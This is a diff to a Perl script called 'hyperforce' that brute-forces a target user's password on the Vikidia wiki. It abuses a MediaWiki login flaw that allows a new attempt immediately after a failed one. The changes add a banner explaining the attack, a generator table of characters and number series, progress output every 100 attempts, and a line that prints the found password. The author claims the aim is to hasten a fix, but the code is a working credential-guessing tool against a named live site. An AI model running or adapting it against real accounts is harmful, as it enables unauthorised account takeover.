@@ -17,6 +17,18 @@ use strict;
 use LWP::UserAgent;
 use HTTP::Cookies;
 
+print "\n    *** Welcome to hyperforce! ***\n\n";
+print "  This little script tries to guess your target's password on Vikidia.\n";
+print "  It is able to do it because of a *major security breach* in the\n";
+print "  MediaWiki's authentication process which allows a new login request\n";
+print "  immediatly after an erroneous one.\n\n";
+print "  You will be notified each 100 requests (because displaying each\n";
+print "  password slows the bruteforce). This allows you to relaunch the\n";
+print "  attack from a given password instead of from the beginning.\n";
+print "  Just modify in the code the first value of the \@struct variable.\n\n";
+print "  I made this program to accelerate the fixing procedure which was a\n";
+print "  little slow ;)\n\n";
+
 # GLOBAL
   my $ua = LWP::UserAgent->new(
     agent => 'Hyperion/5.0.perl (thilp/bot/lol)',
@@ -27,7 +39,7 @@ use HTTP::Cookies;
     )
   );
   $ua->timeout(10);
-  $ua->from('*******@*********');
+  $ua->from('thilp.is@gmail.com');
 # END GLOBAL
 
 sub requeteAPI
@@ -70,31 +82,31 @@ sub connexion
 # PASSWORD GENERATION
 
 # @struct describes the password structure
-my @struct = (3,133,0);
+my @struct = (0,0,43,2,27);
 # @table contains all the strings that can be assembled to generate $pwd
 my @table = (
   # WORDS
-  'bonjour','salut','pass','motdepasse','azerty', 'vikidia',
-  'viki','wiki','lol',
-  # SERIES
-  '123456789','123456','6789','9876','987654321','02357',
-  '2468','1357',
-  # NUMBERS
-  '0','1','2','3','4','5','6','7','8','9',
-  '10','11','12','13','14','15','16','17','18','19',
-  '20','21','22','23','24','25','26','27','28','29',
-  '30','31','32','33','34','35','36','37','38','39',
-  '40','41','42','43','44','45','46','47','48','49',
-  '50','51','52','53','54','55','56','57','58','59',
-  '60','61','62','63','64','65','66','67','68','69',
-  '70','71','72','73','74','75','76','77','78','79',
-  '80','81','82','83','84','85','86','87','88','89',
-  '90','91','92','93','94','95','96','97','98','99',
+#  'bonjour','salut','pass','motdepasse','azerty', 'vikidia',
+#  'viki','wiki','lol',
   # LETTERS
   'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
   'r','s','t','u','v','w','x','y','z',
+  # NUMBERS
+  '0','1','2','3','4','5','6','7','8','9',
+#  '10','11','12','13','14','15','16','17','18','19',
+#  '20','21','22','23','24','25','26','27','28','29',
+#  '30','31','32','33','34','35','36','37','38','39',
+#  '40','41','42','43','44','45','46','47','48','49',
+#  '50','51','52','53','54','55','56','57','58','59',
+#  '60','61','62','63','64','65','66','67','68','69',
+#  '70','71','72','73','74','75','76','77','78','79',
+#  '80','81','82','83','84','85','86','87','88','89',
+#  '90','91','92','93','94','95','96','97','98','99',
   # SYMBOLS
-  '!','-','+'
+  '!','-','+',
+  # SERIES
+  '123456789','123456','6789','9876','987654321','02357',
+  '2468','1357'
 );
 
 # Generation function: takes the \@struct, changes it and
@@ -130,22 +142,23 @@ sub generate_pwd
   }
 }
 
-
 # User interaction and main script
 
 my $result;
 my $ret = 0;
+my $count = 0;
+my $pass;
 
 if (@ARGV == 1)
 {
   while ($ret == 0)
   {
-    my $pass = generate_pwd(\@struct);
-    print "Trying with $pass... ";
+    $pass = generate_pwd(\@struct);
+    print("Trying with ".$pass."...\n") if ($count % 100 == 0);
     $ret = connexion($ARGV[0], $pass, \$result);
-    print "doesn't match: $result.\n" if ($ret == 0);
+    $count++;
   }
-  print "PASSWORD FOUND!\n";
+  print "PASSWORD FOUND! >> ".$pass."\n";
 }
 else
 {
